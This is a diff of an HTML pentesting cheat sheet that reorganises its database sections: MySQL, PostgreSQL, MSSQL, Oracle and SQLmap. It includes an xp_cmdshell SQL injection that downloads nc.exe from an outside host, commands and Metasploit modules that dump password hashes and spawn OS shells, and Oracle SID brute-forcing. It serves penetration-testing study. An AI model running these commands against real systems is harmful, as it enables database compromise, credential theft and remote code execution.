@@ -1295,141 +1295,6 @@ print(server<span style="color:#f92672">.</span>info)
 </tbody>
 </table>
 <p><strong>ADD BLIND AND TIME BASED</strong></p>
-<h3 id="mssql">MSSQL<a href="#mssql" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
-<ul>
-<li>port TCP/1433, TCP/2433</li>
-<li>TCP/1434 Named instance</li>
-<li>UDP/1434 SQL Server Browse</li>
-<li>Password hashes are stored in <code>master.dbo.sysxlogins</code></li>
-</ul>
-<table>
-<thead>
-<tr>
-<th>Command</th>
-<th>Description</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td><code>sqlcmd -u &lt;user&gt; -p &lt;password&gt;</code></td>
-<td>Login to mssql locally in cmd</td>
-</tr>
-<tr>
-<td><code>'EXEC xp_cmdshell 'powershell -c Invoke-WebRequest -Uri &quot;http://192.168.22.2:8000/nc.exe&quot; -OutFile &quot;C:\windows\Temp\nc.exe&quot;'; --</code></td>
-<td>Command execution with xp_cmdshell (dir, type, ls etc do not work as stdout won&rsquo;t be displayed)</td>
-</tr>
-<tr>
-<td><code>sqlmap -u &quot;htpL//&lt;url&gt;&quot; --os-shell</code></td>
-<td>Command execution through sqlmap xp_cmdshell</td>
-</tr>
-<tr>
-<td><code>SELECT @@version</code></td>
-<td>DB version</td>
-</tr>
-<tr>
-<td><code>SELECT name FROM syscolumns WHERE id=(SELECT id FROM sysobjects WHERE name='mytable');</code></td>
-<td>List columns</td>
-</tr>
-</tbody>
-</table>
-<h2 id="oracle-db">Oracle DB<a href="#oracle-db" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
-<ul>
-<li>Port 1521</li>
-<li>Oracle use something called the <strong>Transparent Network Substrate (TNS)</strong> for authenticating to their databases. It is a protocol that handles authentication outside of the database.</li>
-<li>Oracle used SID values to uniquely identify databases
-<ul>
-<li>SID values can be bruteforced to discover databases within an Oracle environment (version 9.2.0.7 and below)</li>
-<li><code>use auxiliary/scanner/oracle/sid_enum</code></li>
-<li><code>use auxiliary/scanner/oracle/sid_brute</code></li>
-</ul>
-</li>
-<li>Password hashes are stored in <code>sys.user$</code></li>
-</ul>
-<p><code>nmap -sSV -p1521 -n &lt;IP&gt;</code></p>
-<table>
-<thead>
-<tr>
-<th>Command</th>
-<th>Description</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>SELECT * FROM v$version;*</td>
-<td>DB Version</td>
-</tr>
-<tr>
-<td>SELECT instance_name FROM v$instance</td>
-<td>Current DB</td>
-</tr>
-<tr>
-<td>SELECT name FROM v$database</td>
-<td>Current DB</td>
-</tr>
-<tr>
-<td>SELECT DISTINCT owner FROM all_tables;</td>
-<td>List DBs</td>
-</tr>
-<tr>
-<td>SELECT user FROM dual;</td>
-<td>current user</td>
-</tr>
-<tr>
-<td>SELECT username FROM all_users ORBERY BY username;</td>
-<td>List users</td>
-</tr>
-<tr>
-<td>SELECT column_name FROM all_tab_columns;</td>
-<td>List tables</td>
-</tr>
-<tr>
-<td>SELECT name, password, astatus FROM sys.user$;</td>
-<td>List password hashes</td>
-</tr>
-</tbody>
-</table>
-<h3 id="connect-to-oracle-db">Connect to Oracle DB<a href="#connect-to-oracle-db" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
-<h4 id="windows-1">WIndows<a href="#windows-1" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
-<pre tabindex="0"><code>CONNECT username/password@&lt;IP&gt;:&lt;PORT&gt;
-</code></pre><h4 id="linux-1">Linux<a href="#linux-1" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ export ORACLE_HOME<span style="color:#f92672">=</span>/path/to/oracle/home 			<span style="color:#75715e">#usually /usr/lib/oracle/&lt;version&gt;/client64/</span>
-$ export LD_LIBRARY_PATH<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;</span>$ORACLE_HOME<span style="color:#e6db74">&#34;</span>
-$ export PATH<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;</span>$ORACLE_HOME<span style="color:#e6db74">:</span>$PATH<span style="color:#e6db74">&#34;</span>
-</code></pre></div><p>Local:</p>
-<pre tabindex="0"><code>sqlplus sys as sysdba
-</code></pre><p>Remote:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sqlplus username/password@&lt;IP&gt;/&lt;database&gt;
-</code></pre></div><h5 id="tns-connectivity">TNS Connectivity<a href="#tns-connectivity" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h5>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">tnscmd10g
-
-tnscmd10g version -h &lt;IP&gt;
-</code></pre></div><h2 id="sqlmap">SQLmap<a href="#sqlmap" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
-<table>
-<thead>
-<tr>
-<th>Command</th>
-<th>Description</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td><code>sqlmap -u &quot;http://&lt;url&gt;&quot;</code></td>
-<td>check its injectable</td>
-</tr>
-<tr>
-<td><code>sqlmap -u &quot;http://&lt;url&gt; --current-db</code></td>
-<td>Grab current database</td>
-</tr>
-<tr>
-<td><code>sqlmap -u &quot;http://&lt;url&gt; -D &quot;database&quot; --tables</code></td>
-<td>Grab table names for current DB</td>
-</tr>
-<tr>
-<td><code>sqlmap -u &quot;http://&lt;url&gt; -D &quot;database&quot; -T &quot;tableName&quot; --dump</code></td>
-<td>Get contents of table</td>
-</tr>
-</tbody>
-</table>
 <h2 id="command-injection">Command injection<a href="#command-injection" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
 <table>
 <thead>
@@ -1564,6 +1429,258 @@ tnscmd10g version -h &lt;IP&gt;
 <tr>
 <td></td>
 <td></td>
+</tr>
+</tbody>
+</table>
+<h1 id="databases">Databases<a href="#databases" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<h2 id="mysql">MySQL<a href="#mysql" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>select version();</code></td>
+<td>get version</td>
+</tr>
+<tr>
+<td><code>show databases; </code></td>
+<td>show databases</td>
+</tr>
+<tr>
+<td><code>show tables;</code></td>
+<td>show tables</td>
+</tr>
+<tr>
+<td><code>use &lt;database name&gt;; </code></td>
+<td>enter that database</td>
+</tr>
+<tr>
+<td><code>select * from &lt;table name&gt;;</code></td>
+<td>select info from a table</td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<h2 id="postgresql">PostgreSQL<a href="#postgresql" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>psql -U &lt;myuser&gt; &lt;IP&gt;</code></td>
+<td></td>
+</tr>
+<tr>
+<td><code>psql -h &lt;host&gt; -U &lt;username&gt; -d &lt;database&gt; </code></td>
+<td>Remote connection</td>
+</tr>
+<tr>
+<td><code>psql -h &lt;host&gt; -p &lt;port&gt; -U &lt;username&gt; -W &lt;password&gt; &lt;database&gt;</code></td>
+<td>Remote connection</td>
+</tr>
+<tr>
+<td><code>\list</code></td>
+<td>List databases</td>
+</tr>
+<tr>
+<td><code>\c &lt;database&gt;</code></td>
+<td>Use database</td>
+</tr>
+<tr>
+<td><code>\d</code></td>
+<td>List tables</td>
+</tr>
+<tr>
+<td><code>\du+</code></td>
+<td>List user toles</td>
+</tr>
+<tr>
+<td><code>\conninfo</code></td>
+<td>Connection information</td>
+</tr>
+<tr>
+<td><code>SHOW hba_file;</code></td>
+<td>find config files</td>
+</tr>
+<tr>
+<td><code>SELECT usename, passwd from pg_shadow;</code></td>
+<td>Grab password hashes</td>
+</tr>
+<tr>
+<td><code>createdb &lt;database name&gt;</code></td>
+<td>Create a database</td>
+</tr>
+<tr>
+<td><code>psql -d &lt;database name&gt;</code></td>
+<td>Login locally to database</td>
+</tr>
+<tr>
+<td><code>REATE TABLE users (ID INT PRIMARY KEY NOT NULL, username character (255) NOT NULL, password character (255) NOT NULL);</code></td>
+<td>Create table</td>
+</tr>
+<tr>
+<td><code>INSERT INTO users (ID, username, password) values ('1', 'administrator', '736a125730d192f1560ac2f56798ac958c5f84b086b48a8bc9da3217f9477c6b');</code></td>
+<td>Insert data into table</td>
+</tr>
+<tr>
+<td><code>DROP TABLE &lt;table_name&gt;;</code></td>
+<td>Delete table</td>
+</tr>
+<tr>
+<td><code>ALTER USER &lt;user&gt; WITH PASSWORD '&lt;password&gt;';</code></td>
+<td>Change password for user</td>
+</tr>
+</tbody>
+</table>
+<h3 id="metasploit-modules">Metasploit modules<a href="#metasploit-modules" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">msf&gt; use auxiliary/scanner/postgres/postgres_hashdump
+msf&gt; use auxiliary/scanner/postgres/postgres_schemadump
+msf&gt; use auxiliary/admin/postgres/postgres_readfile
+msf&gt; use exploit/linux/postgres/postgres_payload
+msf&gt; use exploit/windows/postgres/postgres_payload
+</code></pre></div><h2 id="mssql">MSSQL<a href="#mssql" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<ul>
+<li>port TCP/1433, TCP/2433</li>
+<li>TCP/1434 Named instance</li>
+<li>UDP/1434 SQL Server Browse</li>
+<li>Password hashes are stored in <code>master.dbo.sysxlogins</code></li>
+</ul>
+<table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>sqlcmd -u &lt;user&gt; -p &lt;password&gt;</code></td>
+<td>Login to mssql locally in cmd</td>
+</tr>
+<tr>
+<td><code>'EXEC xp_cmdshell 'powershell -c Invoke-WebRequest -Uri &quot;http://192.168.22.2:8000/nc.exe&quot; -OutFile &quot;C:\windows\Temp\nc.exe&quot;'; --</code></td>
+<td>Command execution with xp_cmdshell (dir, type, ls etc do not work as stdout won&rsquo;t be displayed)</td>
+</tr>
+<tr>
+<td><code>sqlmap -u &quot;htpL//&lt;url&gt;&quot; --os-shell</code></td>
+<td>Command execution through sqlmap xp_cmdshell</td>
+</tr>
+<tr>
+<td><code>SELECT @@version</code></td>
+<td>DB version</td>
+</tr>
+<tr>
+<td><code>SELECT name FROM syscolumns WHERE id=(SELECT id FROM sysobjects WHERE name='mytable');</code></td>
+<td>List columns</td>
+</tr>
+</tbody>
+</table>
+<h2 id="oracle-db">Oracle DB<a href="#oracle-db" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<ul>
+<li>Port 1521</li>
+<li>Oracle use something called the <strong>Transparent Network Substrate (TNS)</strong> for authenticating to their databases. It is a protocol that handles authentication outside of the database.</li>
+<li>Oracle used SID values to uniquely identify databases
+<ul>
+<li>SID values can be bruteforced to discover databases within an Oracle environment (version 9.2.0.7 and below)</li>
+<li><code>use auxiliary/scanner/oracle/sid_enum</code></li>
+<li><code>use auxiliary/scanner/oracle/sid_brute</code></li>
+</ul>
+</li>
+<li>Password hashes are stored in <code>sys.user$</code></li>
+</ul>
+<p><code>nmap -sSV -p1521 -n &lt;IP&gt;</code></p>
+<table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>SELECT * FROM v$version;*</td>
+<td>DB Version</td>
+</tr>
+<tr>
+<td>SELECT instance_name FROM v$instance</td>
+<td>Current DB</td>
+</tr>
+<tr>
+<td>SELECT name FROM v$database</td>
+<td>Current DB</td>
+</tr>
+<tr>
+<td>SELECT DISTINCT owner FROM all_tables;</td>
+<td>List DBs</td>
+</tr>
+<tr>
+<td>SELECT user FROM dual;</td>
+<td>current user</td>
+</tr>
+<tr>
+<td>SELECT username FROM all_users ORBERY BY username;</td>
+<td>List users</td>
+</tr>
+<tr>
+<td>SELECT column_name FROM all_tab_columns;</td>
+<td>List tables</td>
+</tr>
+<tr>
+<td>SELECT name, password, astatus FROM sys.user$;</td>
+<td>List password hashes</td>
+</tr>
+</tbody>
+</table>
+<h3 id="connect-to-oracle-db">Connect to Oracle DB<a href="#connect-to-oracle-db" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<h4 id="windows-1">WIndows<a href="#windows-1" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
+<pre tabindex="0"><code>CONNECT username/password@&lt;IP&gt;:&lt;PORT&gt;
+</code></pre><h4 id="linux-1">Linux<a href="#linux-1" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ export ORACLE_HOME<span style="color:#f92672">=</span>/path/to/oracle/home 			<span style="color:#75715e">#usually /usr/lib/oracle/&lt;version&gt;/client64/</span>
+$ export LD_LIBRARY_PATH<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;</span>$ORACLE_HOME<span style="color:#e6db74">&#34;</span>
+$ export PATH<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;</span>$ORACLE_HOME<span style="color:#e6db74">:</span>$PATH<span style="color:#e6db74">&#34;</span>
+</code></pre></div><p>Local:</p>
+<pre tabindex="0"><code>sqlplus sys as sysdba
+</code></pre><p>Remote:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sqlplus username/password@&lt;IP&gt;/&lt;database&gt;
+</code></pre></div><h5 id="tns-connectivity">TNS Connectivity<a href="#tns-connectivity" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h5>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">tnscmd10g
+
+tnscmd10g version -h &lt;IP&gt;
+</code></pre></div><h2 id="sqlmap">SQLmap<a href="#sqlmap" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>sqlmap -u &quot;http://&lt;url&gt;&quot;</code></td>
+<td>check its injectable</td>
+</tr>
+<tr>
+<td><code>sqlmap -u &quot;http://&lt;url&gt; --current-db</code></td>
+<td>Grab current database</td>
+</tr>
+<tr>
+<td><code>sqlmap -u &quot;http://&lt;url&gt; -D &quot;database&quot; --tables</code></td>
+<td>Grab table names for current DB</td>
+</tr>
+<tr>
+<td><code>sqlmap -u &quot;http://&lt;url&gt; -D &quot;database&quot; -T &quot;tableName&quot; --dump</code></td>
+<td>Get contents of table</td>
 </tr>
 </tbody>
 </table>
